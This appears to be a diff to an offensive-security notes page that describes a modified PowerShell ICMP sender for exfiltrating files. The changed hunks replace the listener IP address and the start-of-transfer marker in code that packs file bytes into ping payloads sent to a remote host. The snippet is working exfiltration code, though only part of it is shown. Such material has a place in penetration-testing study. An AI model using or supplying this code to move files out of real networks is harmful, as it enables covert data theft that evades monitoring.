@@ -26,7 +26,7 @@ listen()
 A good option for recent Windows based systems is a modified [Powershell-ICMP-Sender](https://github.com/api0cradle/Powershell-ICMP).
 
 ```powershell
-    $IPAddress = "10.10.15.39"
+    $IPAddress = "192.168.0.1"
     $ICMPClient = New-Object System.Net.NetworkInformation.Ping
     $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
     $PingOptions.DontFragment = $true
@@ -43,7 +43,7 @@ A good option for recent Windows based systems is a modified [Powershell-ICMP-Se
     $barr = New-Object byte[] $bufSize
 
     # Start of Transfer
-    $sendbytes = ([text.encoding]::ASCII).GetBytes("^BOFbackup.zip")
+    $sendbytes = ([text.encoding]::ASCII).GetBytes("^BOFbackfile")
     $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null
 
 
